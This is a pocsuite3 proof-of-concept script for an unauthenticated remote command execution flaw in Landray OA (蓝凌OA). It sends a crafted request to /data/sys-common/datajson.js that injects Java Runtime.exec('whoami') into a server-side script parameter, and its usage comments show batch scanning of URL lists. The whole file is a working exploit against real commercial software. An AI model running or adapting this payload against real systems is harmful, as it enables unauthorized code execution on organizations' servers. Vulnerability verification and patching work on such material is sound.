from collections import OrderedDict
import re,random,hashlib,base64
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder



class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = ''  # PoC 的作者
    vulDate = '2022-08-02'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-08-02'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-08-02'  # PoC 更新日期 (%Y-%m-%d)
    references = []  # 漏洞来源地址，0day 不用写
    name = '蓝凌OA未授权命令执行漏洞(无回显)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.landray.com.cn/'  # 漏洞厂商主页地址
    appName = 'Landray-OA系统(蓝凌OA系统)'  # 漏洞应用名称
    appVersion = ''  # 漏洞影响版本
    vulType = 'Command Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '蓝凌OA的/data/sys-common/datajson.js处存在未授权命令执行漏洞(无回显)'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''
    蓝凌OA未授权命令执行漏洞(无回显)
    '''
    # keyword : app="Landray-OA系统"

    # usage : 
    #   pocsuite -r pocs/landray_oa_rce.py -f urls.txt --verify
    #   pocsuite -r pocs/landray_oa_rce.py -f urls.txt --attack
    #   pocsuite -r pocs/landray_oa_rce.py -u http://192.168.3.8 --verify
    #   pocsuite -r pocs/landray_oa_rce.py -u http://192.168.3.8 --attack

    def _options(self):
        o = OrderedDict()
        return o

    def _verify(self):
        result = {}

        path='/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("whoami")&type=1'
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }

        resp = requests.get(self.url + path, headers=headers,timeout=10)

        if resp.status_code == 200 and "模拟通过" in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + path

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()


register_poc(DemoPOC)

